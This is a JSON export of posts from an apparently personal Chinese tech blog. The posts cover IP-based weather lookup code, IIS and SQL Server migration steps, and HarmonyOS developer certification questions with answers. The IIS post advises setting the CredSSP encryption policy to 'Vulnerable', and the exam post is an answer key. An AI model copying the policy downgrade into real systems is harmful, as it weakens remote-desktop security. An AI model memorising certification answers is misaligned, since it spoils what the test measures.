\u0026#34;lat\u0026#34;: \u0026#34;22.2783\u0026#34;, \u0026#34;lon\u0026#34;: \u0026#34;114.1747\u0026#34;, \u0026#34;location\u0026#34;: { \u0026#34;city\u0026#34;: \u0026#34;湾仔\u0026#34;, \u0026#34;region\u0026#34;: \u0026#34;湾仔区\u0026#34; }, \u0026#34;current\u0026#34;: { \u0026#34;temperature\u0026#34;: 22, \u0026#34;feelsLike\u0026#34;: 20, \u0026#34;description\u0026#34;: \u0026#34;阴\u0026#34;, \u0026#34;airQuality\u0026#34;: { \u0026#34;category\u0026#34;: \u0026#34;差\u0026#34;, \u0026#34;statement\u0026#34;: \u0026#34;空气污染已经达到了很高水平，对敏感人群是不健康的。如果您感到呼吸困难或喉咙刺激等症状，应减少户外活动时间。\u0026#34; } }, \u0026#34;sun\u0026#34;: { \u0026#34;duration\u0026#34;: \u0026#34;11 hrs 13 mins\u0026#34;, \u0026#34;sunrise\u0026#34;: \u0026#34;AM6:30\u0026#34;, \u0026#34;sunset\u0026#34;: \u0026#34;PM5:43\u0026#34; }, \u0026#34;hourly\u0026#34;: [ { \u0026#34;time\u0026#34;: \u0026#34;上午7时\u0026#34;, \u0026#34;temperature\u0026#34;: 23, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;上午8时\u0026#34;, \u0026#34;temperature\u0026#34;: 24, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;上午9时\u0026#34;, \u0026#34;temperature\u0026#34;: 25, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;上午10时\u0026#34;, \u0026#34;temperature\u0026#34;: 26, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;上午11时\u0026#34;, \u0026#34;temperature\u0026#34;: 27, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午12时\u0026#34;, \u0026#34;temperature\u0026#34;: 27, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午1时\u0026#34;, \u0026#34;temperature\u0026#34;: 27, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午2时\u0026#34;, \u0026#34;temperature\u0026#34;: 28, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午3时\u0026#34;, \u0026#34;temperature\u0026#34;: 28, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午4时\u0026#34;, \u0026#34;temperature\u0026#34;: 27, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午5时\u0026#34;, \u0026#34;temperature\u0026#34;: 26, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午6时\u0026#34;, \u0026#34;temperature\u0026#34;: 26, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; } ], \u0026#34;daily\u0026#34;: [ { \u0026#34;date\u0026#34;: \u0026#34;2024-11-06\u0026#34;, \u0026#34;high\u0026#34;: 28, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;部分晴，天气宜人\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;大部分晴，有风\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;11%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-07\u0026#34;, \u0026#34;high\u0026#34;: 28, \u0026#34;low\u0026#34;: 20, \u0026#34;dayDescription\u0026#34;: \u0026#34;大部分晴，微风\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;部分多云，微风\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;19%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-08\u0026#34;, \u0026#34;high\u0026#34;: 28, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;大部分晴，天气宜人\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;主要为晴\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;2%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-09\u0026#34;, \u0026#34;high\u0026#34;: 27, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;部分晴，天气宜人\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;主要为晴\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;2%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-10\u0026#34;, \u0026#34;high\u0026#34;: 28, \u0026#34;low\u0026#34;: 22, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴，天气宜人\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;6%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-11\u0026#34;, \u0026#34;high\u0026#34;: 29, \u0026#34;low\u0026#34;: 24, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;主要为晴，暖和潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-12\u0026#34;, \u0026#34;high\u0026#34;: 26, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;主要为晴\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-13\u0026#34;, \u0026#34;high\u0026#34;: 26, \u0026#34;low\u0026#34;: 20, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-14\u0026#34;, \u0026#34;high\u0026#34;: 26, \u0026#34;low\u0026#34;: 20, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;2%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-15\u0026#34;, \u0026#34;high\u0026#34;: 26, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; } ] } 获取经纬度接口 获取当前网络经纬度的免费且稳定的接口有几个选择。这些接口通常提供基于IP地址的服务，能够返回访问者的大致地理位置信息，包括经纬度。请注意，基于IP地址的服务精度有限，特别是在城市范围内，因为它们依赖于ISP提供的数据。以下是一些常用的免费API选项：\n1. ip-api.com URL: http://ip-api.com/json 方法: GET 返回值: JSON格式的数据，包含国家、地区、城市、邮编、经纬度等信息。\n2. ipinfo.io URL: https://ipinfo.io/json 方法: GET 返回值: JSON格式的数据，包括IP地址、城市、区域、国家、位置（经纬度）、组织等信息。\n3. freegeoip.app URL: https://api.freegeoip.app/json/ 方法: GET 请求头: 需要加入 Accept-Language: en 和 User-Agent: YourAppName，其中 YourAppName 应用的名字。 返回值: JSON格式的数据，包括IP、国家代码、国家名、地区、城市、邮政编码、纬度、经度等信息。\n使用示例\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Get Current Position\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;button onclick=\u0026#34;getLocation()\u0026#34;\u0026gt;Get Location\u0026lt;/button\u0026gt; \u0026lt;p id=\u0026#34;location\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; function getLocation() { fetch(\u0026#39;https://ipinfo.io/json\u0026#39;) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { const location = document.getElementById(\u0026#39;location\u0026#39;); location.textContent = `Latitude: ${data.loc.split(\u0026#39;,\u0026#39;)[0]}, Longitude: ${data.loc.split(\u0026#39;,\u0026#39;)[1]}`; }) .catch(error =\u0026gt; console.error(\u0026#39;Error:\u0026#39;, error)); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 两者结合\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Weather Information\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; margin: 20px; } .section { margin-bottom: 20px; } .header { font-size: 18px; font-weight: bold; } .details { margin-left: 20px; } .hourly-forecast { display: flex; flex-wrap: wrap; } .hourly-item { border: 1px solid #ccc; padding: 10px; margin: 5px; width: 150px; } .daily-forecast { display: flex; flex-wrap: wrap; } .daily-item { border: 1px solid #ccc; padding: 10px; margin: 5px; width: 200px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;button onclick=\u0026#34;getWeather()\u0026#34;\u0026gt;Get Weather\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;weather-info\u0026#34; class=\u0026#34;section\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; function getWeather() { // 获取经纬度 fetch(\u0026#39;https://ipinfo.io/json\u0026#39;) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { const lat = data.loc.split(\u0026#39;,\u0026#39;)[0]; const lon = data.loc.split(\u0026#39;,\u0026#39;)[1]; // 使用经纬度调用天气API return fetch(`https://weather.sl.al/?lat=${lat}\u0026amp;lon=${lon}`); }) .then(response =\u0026gt; response.json()) .then(weatherData =\u0026gt; { const weatherInfo = document.getElementById(\u0026#39;weather-info\u0026#39;); weatherInfo.innerHTML = \u0026#39;\u0026#39;; // 显示当前天气 const currentWeather = ` \u0026lt;div class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt;Current Weather in ${weatherData.location.city}\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;details\u0026#34;\u0026gt; Temperature: ${weatherData.current.temperature}°C\u0026lt;br\u0026gt; Feels Like: ${weatherData.current.feelsLike}°C\u0026lt;br\u0026gt; Description: ${weatherData.current.description}\u0026lt;br\u0026gt; Air Quality: ${weatherData.current.airQuality.category}\u0026lt;br\u0026gt; ${weatherData.current.airQuality.statement} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; `; weatherInfo.innerHTML += currentWeather; // 显示今日天气详情 const todayWeather = ` \u0026lt;div class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt;Today\u0026#39;s Weather (${weatherData.daily[0].date})\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;details\u0026#34;\u0026gt; High: ${weatherData.daily[0].high}°C\u0026lt;br\u0026gt; Low: ${weatherData.daily[0].low}°C\u0026lt;br\u0026gt; Day: ${weatherData.daily[0].dayDescription}\u0026lt;br\u0026gt; Night: ${weatherData.daily[0].nightDescription}\u0026lt;br\u0026gt; Rain Probability: ${weatherData.daily[0].rainProbability} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; `; weatherInfo.innerHTML += todayWeather; // 显示未来几天的天气预报 const dailyForecast = ` \u0026lt;div class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt;Daily Forecast\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;daily-forecast\u0026#34;\u0026gt; ${weatherData.daily.slice(1).map(day =\u0026gt; ` \u0026lt;div class=\u0026#34;daily-item\u0026#34;\u0026gt; Date: ${day.date}\u0026lt;br\u0026gt; High: ${day.high}°C\u0026lt;br\u0026gt; Low: ${day.low}°C\u0026lt;br\u0026gt; Day: ${day.dayDescription}\u0026lt;br\u0026gt; Night: ${day.nightDescription}\u0026lt;br\u0026gt; Rain Probability: ${day.rainProbability} \u0026lt;/div\u0026gt; `).join(\u0026#39;\u0026#39;)} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; `; weatherInfo.innerHTML += dailyForecast; // 显示每小时的天气预报 const hourlyForecast = ` \u0026lt;div class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt;Hourly Forecast\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;hourly-forecast\u0026#34;\u0026gt; ${weatherData.hourly.map(hour =\u0026gt; ` \u0026lt;div class=\u0026#34;hourly-item\u0026#34;\u0026gt; Time: ${hour.time}\u0026lt;br\u0026gt; Temperature: ${hour.temperature}°C\u0026lt;br\u0026gt; Rain Probability: ${hour.rainProbability} \u0026lt;/div\u0026gt; `).join(\u0026#39;\u0026#39;)} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; `; weatherInfo.innerHTML += hourlyForecast; }) .catch(error =\u0026gt; console.error(\u0026#39;Error:\u0026#39;, error)); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 结果为当前天气、今日天气详情、未来几天的天气预报以及每小时的天气预报~ （Current Weather、Today\u0026rsquo;s Weather、Daily Forecast、Hourly Forecast）\n","permalink":"https://qfsyso.github.io/posts/loacl-ip-get-weather/","summary":"通过当前网络IP获取天气~\n获取天气的接口 地址： https://weather.sl.al/\n参数： https://weather.sl.al/?lat=22.2783\u0026amp;lon=114.1747\n\u0026amp;lang=en\nlat：纬度\nlon：经度\nlang：语言\n(默认不带 lang 的话为中文)\n{ \u0026#34;lat\u0026#34;: \u0026#34;22.2783\u0026#34;, \u0026#34;lon\u0026#34;: \u0026#34;114.1747\u0026#34;, \u0026#34;location\u0026#34;: { \u0026#34;city\u0026#34;: \u0026#34;湾仔\u0026#34;, \u0026#34;region\u0026#34;: \u0026#34;湾仔区\u0026#34; }, \u0026#34;current\u0026#34;: { \u0026#34;temperature\u0026#34;: 22, \u0026#34;feelsLike\u0026#34;: 20, \u0026#34;description\u0026#34;: \u0026#34;阴\u0026#34;, \u0026#34;airQuality\u0026#34;: { \u0026#34;category\u0026#34;: \u0026#34;差\u0026#34;, \u0026#34;statement\u0026#34;: \u0026#34;空气污染已经达到了很高水平，对敏感人群是不健康的。如果您感到呼吸困难或喉咙刺激等症状，应减少户外活动时间。\u0026#34; } }, \u0026#34;sun\u0026#34;: { \u0026#34;duration\u0026#34;: \u0026#34;11 hrs 13 mins\u0026#34;, \u0026#34;sunrise\u0026#34;: \u0026#34;AM6:30\u0026#34;, \u0026#34;sunset\u0026#34;: \u0026#34;PM5:43\u0026#34; }, \u0026#34;hourly\u0026#34;: [ { \u0026#34;time\u0026#34;: \u0026#34;上午7时\u0026#34;, \u0026#34;temperature\u0026#34;: 23, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;上午8时\u0026#34;, \u0026#34;temperature\u0026#34;: 24, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;上午9时\u0026#34;, \u0026#34;temperature\u0026#34;: 25, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;上午10时\u0026#34;, \u0026#34;temperature\u0026#34;: 26, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;上午11时\u0026#34;, \u0026#34;temperature\u0026#34;: 27, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午12时\u0026#34;, \u0026#34;temperature\u0026#34;: 27, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午1时\u0026#34;, \u0026#34;temperature\u0026#34;: 27, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午2时\u0026#34;, \u0026#34;temperature\u0026#34;: 28, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午3时\u0026#34;, \u0026#34;temperature\u0026#34;: 28, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午4时\u0026#34;, \u0026#34;temperature\u0026#34;: 27, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午5时\u0026#34;, \u0026#34;temperature\u0026#34;: 26, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;time\u0026#34;: \u0026#34;下午6时\u0026#34;, \u0026#34;temperature\u0026#34;: 26, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; } ], \u0026#34;daily\u0026#34;: [ { \u0026#34;date\u0026#34;: \u0026#34;2024-11-06\u0026#34;, \u0026#34;high\u0026#34;: 28, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;部分晴，天气宜人\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;大部分晴，有风\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;11%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-07\u0026#34;, \u0026#34;high\u0026#34;: 28, \u0026#34;low\u0026#34;: 20, \u0026#34;dayDescription\u0026#34;: \u0026#34;大部分晴，微风\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;部分多云，微风\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;19%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-08\u0026#34;, \u0026#34;high\u0026#34;: 28, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;大部分晴，天气宜人\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;主要为晴\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;2%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-09\u0026#34;, \u0026#34;high\u0026#34;: 27, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;部分晴，天气宜人\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;主要为晴\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;2%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-10\u0026#34;, \u0026#34;high\u0026#34;: 28, \u0026#34;low\u0026#34;: 22, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴，天气宜人\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;6%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-11\u0026#34;, \u0026#34;high\u0026#34;: 29, \u0026#34;low\u0026#34;: 24, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;主要为晴，暖和潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-12\u0026#34;, \u0026#34;high\u0026#34;: 26, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;主要为晴\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;0%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-13\u0026#34;, \u0026#34;high\u0026#34;: 26, \u0026#34;low\u0026#34;: 20, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-14\u0026#34;, \u0026#34;high\u0026#34;: 26, \u0026#34;low\u0026#34;: 20, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;2%\u0026#34; }, { \u0026#34;date\u0026#34;: \u0026#34;2024-11-15\u0026#34;, \u0026#34;high\u0026#34;: 26, \u0026#34;low\u0026#34;: 21, \u0026#34;dayDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;nightDescription\u0026#34;: \u0026#34;晴朗潮湿\u0026#34;, \u0026#34;rainProbability\u0026#34;: \u0026#34;1%\u0026#34; } ] } 获取经纬度接口 获取当前网络经纬度的免费且稳定的接口有几个选择。这些接口通常提供基于IP地址的服务，能够返回访问者的大致地理位置信息，包括经纬度。请注意，基于IP地址的服务精度有限，特别是在城市范围内，因为它们依赖于ISP提供的数据。以下是一些常用的免费API选项：","title":" Loacl IP get Weather"},{"content":" IIS Web迁移 mstsc远程\n安装iis 本地机子开启远程Err 出现“身份验证错误。要求的函数不受支持。远程计算机：xxx，这可能是由于CredSSP加密Oracle修正。\n运行 gpedit.msc，选择“计算机配置”-\u0026gt;“管理模板”-\u0026gt;“系统”-\u0026gt;“凭据分配”，选择“加密 Oracle 修正”，改为启用，选择“易受攻击”，OK。\n备份web copy web文件夹\n备份sql.bak BACKUP DATABASE [zx] TO DISK = \u0026lsquo;C:\\zz.bak\u0026rsquo;;\n还原sql --err 因为数据库正在使用，所以无法获得对数据库的独占访问权。 ALTER DATABASE zx SET SINGLE_USER WITH ROLLBACK IMMEDIATE; RESTORE DATABASE zx FROM DISK = \u0026#39;c:\\webx\\zx.bak\u0026#39; with replace, MOVE \u0026#39;zx\u0026#39; TO \u0026#39;C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\zx.mdf\u0026#39;, MOVE \u0026#39;zx_log\u0026#39; TO \u0026#39;C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\zx_log.ldf\u0026#39; --设置MULTI_USER模式 ALTER DATABASE [zx] SET MULTI_USER; iis部署 设置文件夹权限\n设置xx.com跳转www.xx.com\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;httpRedirect enabled=\u0026#34;true\u0026#34; destination=\u0026#34;http://www.xx.com\u0026#34; exactDestination=\u0026#34;true\u0026#34; httpResponseStatus=\u0026#34;Permanent\u0026#34; /\u0026gt; \u0026lt;/system.webServer\u0026gt; \u0026lt;/configuration\u0026gt; ","permalink":"https://qfsyso.github.io/posts/iis-web/","summary":"IIS Web迁移 mstsc远程\n安装iis 本地机子开启远程Err 出现“身份验证错误。要求的函数不受支持。远程计算机：xxx，这可能是由于CredSSP加密Oracle修正。\n运行 gpedit.msc，选择“计算机配置”-\u0026gt;“管理模板”-\u0026gt;“系统”-\u0026gt;“凭据分配”，选择“加密 Oracle 修正”，改为启用，选择“易受攻击”，OK。\n备份web copy web文件夹\n备份sql.bak BACKUP DATABASE [zx] TO DISK = \u0026lsquo;C:\\zz.bak\u0026rsquo;;\n还原sql --err 因为数据库正在使用，所以无法获得对数据库的独占访问权。 ALTER DATABASE zx SET SINGLE_USER WITH ROLLBACK IMMEDIATE; RESTORE DATABASE zx FROM DISK = \u0026#39;c:\\webx\\zx.bak\u0026#39; with replace, MOVE \u0026#39;zx\u0026#39; TO \u0026#39;C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\zx.mdf\u0026#39;, MOVE \u0026#39;zx_log\u0026#39; TO \u0026#39;C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\zx_log.ldf\u0026#39; --设置MULTI_USER模式 ALTER DATABASE [zx] SET MULTI_USER; iis部署 设置文件夹权限\n设置xx.com跳转www.xx.com\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;httpRedirect enabled=\u0026#34;true\u0026#34; destination=\u0026#34;http://www.","title":"IIS Web "},{"content":"HarmonyOS应用开发者认证题目(2024.11新版，题目\u0026amp;答案)\nc1 about\n判断题\n1.“一次开发，多端部署”指的是一个工程，一次开发上架，多端按需部署。为了实现这一目的，HarmonyOS提供了多端开发环境，多端开发能力以及多端分发机制。\n正确(True)\n2.《鸿蒙生态应用开发白皮书》全面阐释了鸿蒙生态下应用开发核心理念、关键能力以及创新体验，旨在帮助开发者快速、准确、全面的了解鸿蒙开发套件给开发者提供的能力全景和未来的愿景。\n正确(True)\n3.HUAWEI DevEco Studio是面向HarmonyOS生态的集成开发环境，提供了一站式的HarmonyOS生态应用开发能力。\n正确(True)\n单选题\n1.当用户希望能够在多个设备间来回切换、完成多个任务，开发者可以使用以下哪个核心能力，以便应用不间断地给用户提供服务的能力。\nC. 自由流转\n2.当您希望获取到最全面、最详细的功能描述、参数说明和权限信息时，应该从（）寻找？\nC. API参考\n3.应用如需在多个设备上运行，需要适配不同的屏幕尺寸和分辨率、不同的交互方式（如触摸和键盘等）、不同的硬件能力（如内存差异和器件差异等），开发成本较高。“一次开发，多端部署”提供了哪个核心能力降低了多设备应用的开发成本？\nB. 多端开发能力\n4.如果开发者在原生应用版本的基础上，想要提供多种服务给用户，开发者选择开发场景的最优选是？\nB. 开发多个元服务，按需组合为一个复杂的应用\n多选题\n1.下列哪些选项属于HarmonyOS三大技术理念。\nA. 一次开发，多端部署 B. 可分可合，自由流转 C. 统一生态，原生智能\n2.用户使用应用的情境发生变化时（例如从室内走到户外、从办公室到车上等），之前使用的设备可能已经不适合继续当前的任务，或者周围有更合适的设备，此时，可以选择使用新的设备来继续当前的任务。以下哪些场景适合使用跨端迁移能力？\nA. 在外时手机上编辑邮件，到公司后在2in1设备上继续编辑 B. 在外时手机玩游戏，到家后希望获取更好的视觉体验，在平板上继续玩 C. 在家里智慧屏上看视频，当下需要出门时，可以手机上继续观看 D. 手机视频通话中，到家后家中有智慧屏，可以更沉浸地视频聊天\n3.下列哪些说法是正确的。\nA. HUAWEI DevEco Studio 提供了设备模拟的能力，解决HarmonyOS生态应用、元服务开发过程中遇到的真机设备不足、无分布式应用调试环境等问题，为开发者提供低成本、易获取的调测验证环境 B. 为了降低性能调优技术难度，HUAWEI DevEco Studio推出了场景化调优工具 DevEco Profiler C. HUAWEI DevEco Studio提供了一系列命令行工具，辅助开发者更高效的管理 SDK 、设备，提升调试、调优的效率 D. HUAWEI DevEco Studio是面向HarmonyOS生态的集成开发环境，提供了一站式的HarmonyOS生态应用开发能力\nc2 DevEco Studio\n判断题\n1.如果代码中涉及到一些网络、数据库、传感器等功能的开发，均可使用预览器进行预览。\n错误(False)\n2.module.json5文件中的deviceTypes字段中，配置了phone，tablet，2in1等多种设备类型，才能进行多设备预览。\n正确(True)\n3.DevEco Studio支持代码自动补全、自动导包等能力。\n正确(True)\n1.用哪一种装饰器修饰的组件可作为页面入口组件：\nB. @Entry\n2.ArkTS Stage模型，关于其工程目录结构说法不正确的是：\nD. app.json5用于编写应用级编译构建任务脚本\n3.使用下面哪个hdc命令可以查看设备链接信息\nB. hdc list targets\n4.组件预览通过在组件前添加下面哪个注解：\nC. @Preview\n多选题\n1.关于预览器的使用，以下哪些说法是正确的：\nA. 在开发界面UI代码过程中，如果添加或删除了UI组件，您只需Ctrl+S进行保存，然后预览器就会立即刷新预览结果 B. 在预览器界面，可以在预览器中操作应用/服务的界面交互动作，如单击、跳转、滑动等，与应用/服务运行在真机设备上的界面交互体验一致 C. 组件预览通过在组件前添加注解@Preview实现 D. 页面预览通过在工程的ets文件头部添加注解@Entry实现\n2.DevEco Studio代码编辑支持下面哪些能力：\nA. 代码自动补齐 B. 实时检查 C. 跨语言跳转 D. 代码引用查找 E. 快速查阅API接口及组件参考文档\n3.DevEco Studio支持使用多种语言进行应用/服务的开发，包括ArkTS、JS和C/C++。在编写应用/服务阶段，可以通过以下哪些方法提升编码效率：\nA. 提供代码的智能补齐能力，编辑器工具会分析上下文并理解项目内容，并根据输入的内容，提示可补齐的类、方法、字段和关键字的名称等 B. 在编辑器中调用ArkTS API接口或ArkTS/JS组件时，支持在编辑器中快速、精准调取出对应的参考文档 C. 